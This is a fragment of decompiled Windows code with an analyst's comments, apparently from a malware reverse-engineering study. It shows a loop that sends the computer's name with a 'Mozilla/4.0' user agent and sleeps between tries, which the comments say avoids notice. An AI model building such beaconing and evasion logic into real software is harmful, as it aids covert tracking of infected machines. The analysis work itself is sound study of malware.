    while ( v6 < nSize );                       // loop 1?
  }
  nSize = 35;                                   // adjust nSize
  Destination[0] = 47;                          // start destination with 47
  if ( !GetComputerNameA(&Destination[1], &nSize) )// if function fails
    Destination[0] = 0;                         // change destination[0] = 0
  strcat(Destination, asc_4046C4);              // append so we have 'ComputerName/'
  while ( !runTillDoneFlag )
  {
    sub_401406(v4, aMozilla40, Destination, 1);
    if ( runTillDoneFlag )
      break;
    Sleep(60000 * dword_4046B4);                // sleep after each attempt,
                                                // gotta be patient,
                                                // or some will notice this running multiple
                                                // times
  }
  return 0;
}
// 4046B4: using guessed type int dword_4046B4;
// 4047A4: using guessed type int dword_4047A4;

//----- (00402C2C) --------------------------------------------------------
int __cdecl UserMathErrorFunction()
{
  return 0;
}

// nfuncs=47 queued=27 decompiled=27 lumina nreq=0 worse=0 better=0
// ALL OK, 27 function(s) have been successfully decompiled
